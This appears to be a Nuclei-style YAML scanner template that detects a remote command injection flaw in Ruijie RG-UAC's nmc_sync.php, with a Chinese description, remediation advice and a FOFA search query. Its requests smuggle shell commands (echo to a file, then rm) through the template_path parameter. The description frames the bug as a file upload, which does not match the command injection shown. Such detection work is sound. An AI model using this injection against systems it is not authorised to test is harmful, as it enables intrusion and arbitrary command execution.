id: ruijie-nmc-sync-rce

info:
  name: Ruijie RG-UAC nmc_sync.php - 远程代码执行漏洞
  author: DhiyaneshDk
  severity: critical
  description: |
    该模板用于检测 Ruijie RG-UAC nmc_sync.php - 远程代码执行漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_st...`、`/view/systemConfig/management/{{random_str}}.txt` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
  classification:
    cpe: cpe:2.3:h:ruijie:rg-uac:*:*:*:*:*:*:*:*
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 3
    fofa-query: title="RG-UAC登录页面" && body="admin"
    product: rg-uac
    vendor: ruijie
  tags: rg-uac,fileupload,intrusive,ruijie,vuln

variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2, '{{match_str}}')"
        condition: and
